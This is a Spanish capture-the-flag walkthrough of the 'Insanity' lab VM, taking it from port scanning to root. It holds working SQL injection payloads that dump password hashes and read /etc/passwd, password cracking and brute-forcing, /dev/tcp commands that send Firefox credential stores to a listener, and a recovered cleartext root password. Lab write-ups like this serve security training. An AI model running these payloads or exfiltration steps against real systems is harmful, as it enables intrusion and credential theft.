Reconocimiento de las máquinas en la red:
> sudo arp-scan -I eth0 --localnet > hosts_discovered.txt 
--------------------------------------------------------------------------------                
Reconocimiento de puertos básicos en la máquina:
> sudo nmap -sS -p0-100 -Pn 192.168.1.127 -oN open_ports.txt 
--------------------------------------------------------------------------------                
Reconocimiento de todos los piertos de la máquina:
> sudo nmap -sS -p- -Pn 192.168.1.127 -oN open_ports_full.txt
--------------------------------------------------------------------------------
Reconocer versiones de los puertos abiertos:
> sudo nmap -sSV -p-100 192.168.1.127

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
MAC Address: 00:0C:29:76:98:86 (VMware)
Service Info: OS: Unix

--------------------------------------------------------------------------------                
Reconocer las tecnologías que hay tras el servidor web:
> whatweb 192.168.1.127                          

http://192.168.1.127 [200 OK] Apache[2.4.6], Bootstrap, Country[RESERVED][ZZ], Email[hello@insanityhosting.vm], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/7.2.33], IP[192.168.1.127], JQuery, PHP[7.2.33], Script, Title[Insanity - UK and European Servers], X-UA-Compatible[IE=edge]
--------------------------------------------------------------------------------                
> wfuzz -c --hc 404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.127/FUZZ


********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.127/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000001:   200        479 L    1477 W     22263 Ch    "# directory-list-2.3-
                                                        medium.txt"           
000000003:   200        479 L    1477 W     22263 Ch    "# Copyright 2007 Jame
                                                        s Fisher"             
000000005:   200        479 L    1477 W     22263 Ch    "# This work is licens
                                                        ed under the Creative 
                                                        Commons"              
000000002:   200        479 L    1477 W     22263 Ch    "#"                   
000000004:   200        479 L    1477 W     22263 Ch    "#"                   
000000006:   200        479 L    1477 W     22263 Ch    "# Attribution-Share A
                                                        like 3.0 License. To v
                                                        iew a copy of this"   
000000008:   200        479 L    1477 W     22263 Ch    "# or send a letter to
                                                         Creative Commons, 171
                                                         Second Street,"      
000000011:   200        479 L    1477 W     22263 Ch    "# Priority ordered ca
                                                        se-sensitive list, whe
                                                        re entries were found"
000000012:   200        479 L    1477 W     22263 Ch    "# on at least 2 diffe
                                                        rent hosts"           
000000010:   200        479 L    1477 W     22263 Ch    "#"                   
000000019:   301        7 L      20 W       234 Ch      "news"                
000000007:   200        479 L    1477 W     22263 Ch    "# license, visit http
                                                        ://creativecommons.org
                                                        /licenses/by-sa/3.0/" 
000000009:   200        479 L    1477 W     22263 Ch    "# Suite 300, San Fran
                                                        cisco, California, 941
                                                        05, USA."             
000000013:   200        479 L    1477 W     22263 Ch    "#"                   
000000014:   200        479 L    1477 W     22263 Ch    "http://192.168.1.127/
                                                        "                     
000000039:   301        7 L      20 W       233 Ch      "img"                 
000000182:   301        7 L      20 W       234 Ch      "data"                
000000550:   301        7 L      20 W       233 Ch      "css"                 
000000953:   301        7 L      20 W       232 Ch      "js"                  
000001543:   301        7 L      20 W       237 Ch      "webmail"             
000002771:   301        7 L      20 W       235 Ch      "fonts"               
000003471:   301        7 L      20 W       240 Ch      "monitoring"          
000005377:   200        1 L      10 W       57 Ch       "licence"             
000010825:   301        7 L      20 W       240 Ch      "phpmyadmin"          
000045240:   200        479 L    1477 W     22263 Ch    "http://192.168.1.127/
                                                        "                     
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 196328
Filtered Requests: 196303
Requests/sec.: 0
--------------------------------------------------------------------------------
└─$ cat fuzz.txt | grep "301"
000000019:   301        7 L      20 W       234 Ch      "news"                
000000039:   301        7 L      20 W       233 Ch      "img"                 
000000182:   301        7 L      20 W       234 Ch      "data"                
000000550:   301        7 L      20 W       233 Ch      "css"                 
000000953:   301        7 L      20 W       232 Ch      "js"                  
000001543:   301        7 L      20 W       237 Ch      "webmail"             
000002771:   301        7 L      20 W       235 Ch      "fonts"               
000003471:   301        7 L      20 W       240 Ch      "monitoring"          
000010825:   301        7 L      20 W       240 Ch      "phpmyadmin


Entramos en news
vemos que nombran a un tal Otis que podría ser un potencial usuario.


Entramos en monitoring y vemos que hay una página de entrada con usuario y contraseña
Entramos en webmail y vemos que hay una página de entrada en squirrell mail

Hacemos una ataque de fuerzz bruta con el nombre Otis y el password de un diccionario, y finalmente vemos que el password es 123456
--------------------------------------------------------------------------------
Al entrar en el servicio monitoring, podemos crear entradas donde podemos pone un nombre y una IP
añadimos una entrada en el sistema, con una ip falsa y un hostname cualquiera
Al hacer esto vemos que recibimos un correo en squirell mail (utiliza las mismas credenciales que el sistema de monitoring)

como vemos que hay una página de phpmyadmin podemos pensar que se usa SQL, así que intentamos realizar pruebas para inyectar SQL
--------------------------------------------------------------------------------
> mi_hostaname" union select 1,2,3,4 -- - 
192.192.192.192

y recibimos otro email confirmando que funciona la inyección sql
" UNION SELECT 1,2,3,4 -- -  is down. Please check the report below for more
information.

ID, Host, Date Time, Status
1,2,3,4

--------------------------------------------------------------------------------
miramos qué base de datos utiliza

> " union select 1,2,3, @@version -- -
>test

En el correo recibimos:
" union select 1,2,3, @@version -- - is down. Please check the report below for more
information.

ID, Host, Date Time, Status
1,2,3,5.5.65-MariaDB

--------------------------------------------------------------------------------
Miramos qué tablas existen en la base de datos:

> " union select 1,table_name,3,4 FROM information_schema.tables -- -

" union select 1,table_name,3,4 FROM information_schema.tables -- - is down. Please
check the report below for more information.

ID, Host, Date Time, Status
... ... ... ... 
1,hosts,3,4
1,log,3,4
1,users,3,4
... ... ... ... 
--------------------------------------------------------------------------------
Miramos la tabla users a ver qué columnas contine:

> " union select 1, column_name, 3,4 from information_schema.columns where
table_name='users'--

" union select 1, column_name, 3,4 from information_schema.columns where
table_name='users'-- - is down. Please check the report below for more information.

ID, Host, Date Time, Status
1,id,3,4
1,username,3,4
1,password,3,4
1,email,3,4
hashid
--------------------------------------------------------------------------------
Miramos la tabla users a ver qué contienen los campos username / password :

> " union select 1,concat(username,":",password),3,4 from users -- - 

" union select 1,concat(username,":",password),3,4 from users -- - is down. Please
check the report below for more information.

ID, Host, Date Time, Status
1,admin:$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma,3,4
1,nicholas:$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe,3,4
1,otis:$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW,3,4

--------------------------------------------------------------------------------
Mirando los hashes de los passwords, parece estar hasheados. Buscando qué método se ha usado para hashear parece que ha sido usado Bcrypt
 
podemos intentar crackear los hashes o, podemos intentar crear nuestro password, hashearlo
con el método adivinado, e insertarlo en la tabla. eso nos permitiría entrar en el servicio monitoring, pero a parte de eso, creo que nada más.

password     hash del password bcrypt
admin1234 -> $2a$12$LN.CsUY7y9w4jbCjeX622OCldEp362OcA8tnhRF/n3XNUrSkzEJ5u
--------------------------------------------------------------------------------
También podemos mirar a ver si podemos hacer un LFI (local file inclusion)

> " union select 1,2,load_file('/etc/passwd'),4 -- -
y vemos que si que se puede y devuelve la siguiente infomación:
 
 " union select 1,2,load_file('/etc/passwd'),4 -- - is down. Please check the report
below for more information.

ID, Host, Date Time, Status
1,2,"root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/bash
saslauth:x:997:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
dovenull:x:996:994:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
otis:x:1001:1001::/home/otis:/sbin/nologin
nicholas:x:1002:1002::/home/nicholas:/bin/bash
elliot:x:1003:1003::/home/elliot:/bin/bash
tss:x:59:59:Account used by the trousers package to sandbox the tcsd
daemon:/dev/null:/sbin/nologin
dockerroot:x:995:993:Docker User:/var/lib/docker:/sbin/nologin
monitor:x:1004:1004::/home/monitor:/bin/bash
",4

--------------------------------------------------------------------------------
Siguiendo con la inspección Sql podemos intentar mirar que bases de datos existen:
>" union select 1,2,3,SCHEMA_NAME from information_schema.SCHEMATA  -- -

lo que nos produce la siguiente salida:

" union select 1,2,3,SCHEMA_NAME from information_schema.SCHEMATA  -- - is down.
Please check the report below for more information.

ID, Host, Date Time, Status
1,2,3,information_schema
1,2,3,monitoring
1,2,3,mysql
1,2,3,performance_schema

--------------------------------------------------------------------------------
vamos a ver qué tablas contiene la base de datos mysql:
> union select 1,2,3,table_name from information_schema.tables where
TABLE_SCHEMA='mysql' -- - 

y esto nos produce la siguiente salida:

" union select 1,2,3,table_name from information_schema.tables where
TABLE_SCHEMA='mysql' -- - is down. Please check the report below for more
information.

ID, Host, Date Time, Status
1,2,3,columns_priv
1,2,3,db
1,2,3,event
1,2,3,func
1,2,3,general_log
1,2,3,help_category
1,2,3,help_keyword
1,2,3,help_relation
1,2,3,help_topic
1,2,3,host
1,2,3,ndb_binlog_index
1,2,3,plugin
1,2,3,proc
1,2,3,procs_priv
1,2,3,proxies_priv
1,2,3,servers
1,2,3,slow_log
1,2,3,tables_priv
1,2,3,time_zone
1,2,3,time_zone_leap_second
1,2,3,time_zone_name
1,2,3,time_zone_transition
1,2,3,time_zone_transition_type
1,2,3,user

--------------------------------------------------------------------------------

Observemos ahora qué columnas tiene la tabla user:
> " union select 1, column_name, 3,4 from information_schema.columns where
table_name='user'-- -

y esto nos devuelve la siguiente salida:
	
" union select 1, column_name, 3,4 from information_schema.columns where
table_name='user'-- -  is down. Please check the report below for more information.

ID, Host, Date Time, Status
1,Host,3,4
1,User,3,4
1,Password,3,4
1,Select_priv,3,4
1,Insert_priv,3,4
1,Update_priv,3,4
1,Delete_priv,3,4
1,Create_priv,3,4
1,Drop_priv,3,4
1,Reload_priv,3,4
1,Shutdown_priv,3,4
1,Process_priv,3,4
1,File_priv,3,4
1,Grant_priv,3,4
1,References_priv,3,4
1,Index_priv,3,4
1,Alter_priv,3,4
1,Show_db_priv,3,4
1,Super_priv,3,4
1,Create_tmp_table_priv,3,4
1,Lock_tables_priv,3,4
1,Execute_priv,3,4
1,Repl_slave_priv,3,4
1,Repl_client_priv,3,4
1,Create_view_priv,3,4
1,Show_view_priv,3,4
1,Create_routine_priv,3,4
1,Alter_routine_priv,3,4
1,Create_user_priv,3,4
1,Event_priv,3,4
1,Trigger_priv,3,4
1,Create_tablespace_priv,3,4
1,ssl_type,3,4
1,ssl_cipher,3,4
1,x509_issuer,3,4
1,x509_subject,3,4
1,max_questions,3,4
1,max_updates,3,4
1,max_connections,3,4
1,max_user_connections,3,4
1,plugin,3,4
1,authentication_string,3,4

--------------------------------------------------------------------------------
Vamos a mirar los campos User y authentication_string:

> " union select 1,2,3,concat(User, ":",authentication_string) from mysql.user -- - 

Que da como salida:

" union select 1,2,3,concat(User, ":",authentication_string) from mysql.user -- - is
down. Please check the report below for more information.

ID, Host, Date Time, Status
1,2,3,root:
1,2,3,:
1,2,3,elliot:*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9

Aquí tenemos un potencial password a utilizar. Lo podemos guardar en el fichero code.txt

--------------------------------------------------------------------------------
Analizando el password con hashid dice lo siguiente:
> hashid code.txt

--File 'code.txt'--
Analyzing '*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9'
[+] MySQL5.x 
[+] MySQL4.1 
--End of file 'code.txt'--  

--------------------------------------------------------------------------------
Intentamos crackear el password con john:
> john --wordlist=/usr/share/wordlists/rockyou.txt code.txt

Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
elliot123        (?)     
1g 0:00:00:00 DONE (2023-01-04 05:41) 4.761g/s 630400p/s 630400c/s 630400C/s elmo19..ellie04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

--------------------------------------------------------------------------------

Intentamos entrar en la máquina con ese username / password
> ssh -l 192.168.1.127 

y vemos que tenemos acceso.
--------------------------------------------------------------------------------

Tras inspeccionar brevemente la carpeta home, miramos qué comandos puede utilizar el usuario elliot con privilegios:

> sudo -l
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for elliot: 
Sorry, user elliot may not run sudo on insanityhosting.

--------------------------------------------------------------------------------
Miramos a ver si existe algún fichero con flag setuid:
> find / -perm /4000 2> /dev/null

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
--------------------------------------------------------------------------------
 Ninguna de las anteriores opciones es válida. Así que miramos qué podemos hacer con los directorios que hay en el home del usuario:
  > ls -la

t@insanityhosting ~]$ ls -la
total 16
drwx------. 5 elliot elliot 144 Aug 16  2020 .
drwxr-xr-x. 7 root   root    76 Aug 16  2020 ..
lrwxrwxrwx. 1 root   root     9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--. 1 elliot elliot  18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 elliot elliot 193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 elliot elliot 231 Apr  1  2020 .bashrc
drwx------. 3 elliot elliot  21 Aug 16  2020 .cache
drwx------. 5 elliot elliot  66 Aug 16  2020 .mozilla
drwx------. 2 elliot elliot  25 Aug 16  2020 .ssh
-rw-------. 1 elliot elliot 100 Aug 16  2020 .Xauthority
[elliot@insanityhosting ~]$ 


Dentro del directorio home vemos que hay una carpeta relacionada con mozilla firefox.
--------------------------------------------------------------------------------
Nos metemos dentro hasta una carpeta que contiene los ficheros relacionados con las credenciales guardadas en firefox:
> cd .mozilla/firefox/esmhp32w.default-default]

> ls -la
...
-rw-------. 1 elliot elliot     560 Aug 16  2020 handlers.json
-rw-------. 1 elliot elliot  294912 Aug 16  2020 key4.db
-rw-------. 1 elliot elliot     575 Aug 16  2020 logins.json
-rw-------. 1 elliot elliot      30 Aug 16  2020 notificationstore.json
-rw-rw-r--. 1 elliot elliot       0 Aug 16  2020 .parentlock
-rw-r--r--. 1 elliot elliot   98304 Aug 16  2020 permissions.sqlite
...
--------------------------------------------------------------------------------
Mirando en google. vemos que hay un exploit que permite extraer las credenciales guardadas de firefox:
https://github.com/lclevy/firepwd

descargamos el repositorio en nuestra máquina atacante:
> git clone https://github.com/lclevy/firepwd.git

leyendo las instrucciones dice que necesitamos los ficheros key4.db y logins.json así que nos descargamos dichos ficheros de la máquina víctima.
Creamos un listener en nuestra máquina:

> nc -lvnp 443 > logins.json

y en la máquina víctima enviamos dicho fichero:
> cat logins.json > /dev/tcp/192.168.1.127/443

y lo mismo para el fichero key4.db
> nc -lvnp 443 > key4.db

y en la máquina víctima:
> cat key4.db > /dev/tcp/192.168.1.127/443
--------------------------------------------------------------------------------
Ahora con los ficheros en nuestra máquina atacante podemos ejecutar el exploit:
> python3 firepwd.py -v 1 -d elliot

globalSalt: b'3a12fd1cef387d4857d734af506cac1eea777297'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'2de0a6c19d2cc83df8d1924789e3a8401f0f93d0'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'33609ed3e90bb7d9bc82d753fef67827'
 }
entrySalt: b'2de0a6c19d2cc83df8d1924789e3a8401f0f93d0'
key= b'71d5a4811f76d2d2300a5892cedc321982ee9da634bb158b', iv=b'fddec4866c4cf9a7'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'db18145931efeab51de725370873ab9b3ea6b79d'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ed78aad176bc1b9e000b82afed21486ba9532983851b0db4160ffedd8ba51c35'
 }
entrySalt: b'db18145931efeab51de725370873ab9b3ea6b79d'
key= b'1dd9aa5bffa50d41822114aac13ef00da32946dc5f84954e', iv=b'68be3b415a2a35ed'
b'62aecb76297502a7455792f8a2f8c1f89b0dc89776e032b50808080808080808'
decrypting login/password pairs
https://localhost:10000:b'root',b'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
--------------------------------------------------------------------------------
con esos datos podemos mirar de cambiar de usuario en la máquina víctima:
> su - root
pass: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa

[elliot@insanityhosting ~]$ su - root
Password: 
Last login: Wed Jan  4 11:44:41 GMT 2023 on pts/0
[root@insanityhosting ~]# 
--------------------------------------------------------------------------------
Last login: Wed Jan  4 11:44:41 GMT 2023 on pts/0
[root@insanityhosting ~]# ls -la
total 44
dr-xr-x---.  7 root root  266 Aug 16  2020 .
dr-xr-xr-x. 17 root root  244 Jan  4 10:56 ..
-rw-------.  1 root root 1239 Aug 16  2020 anaconda-ks.cfg
lrwxrwxrwx.  1 root root    9 Aug 16  2020 .bash_history -> /dev/null
-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
drwx------.  3 root root   21 Aug 16  2020 .cache
-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
-rw-r--r--.  1 root root  634 Aug 16  2020 flag.txt
drwx------.  2 root root   99 Aug 16  2020 .gnupg
drwx------.  5 root root   66 Aug 16  2020 .mozilla
drwxr-----.  3 root root   19 Aug 16  2020 .pki
-rw-------.  1 root root 1024 Aug 16  2020 .rnd
drwx------.  2 root root   25 Aug 16  2020 .ssh
-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
-rw-------.  1 root root 5524 Aug 16  2020 .viminfo
-rw-------.  1 root root   50 Aug 16  2020 .Xauthority

--------------------------------------------------------------------------------
> cat flag.txt

[root@insanityhosting ~]# cat flag.txt
    ____                       _ __       
   /  _/___  _________ _____  (_) /___  __
   / // __ \/ ___/ __ `/ __ \/ / __/ / / /
 _/ // / / (__  ) /_/ / / / / / /_/ /_/ / 
/___/_/ /_/____/\__,_/_/ /_/_/\__/\__, /  
                                 /____/   

Well done for completing Insanity. I want to know how difficult you found this - let me know on my blog here: https://security.caerdydd.wales/insanity-ctf/

Follow me on twitter @bootlesshacker

https://security.caerdydd.wales

Please let me know if you have any feedback about my CTF - getting feedback for my CTF keeps me interested in making them.

Thanks!
Bootlesshacker
[root@insanityhosting ~]# 

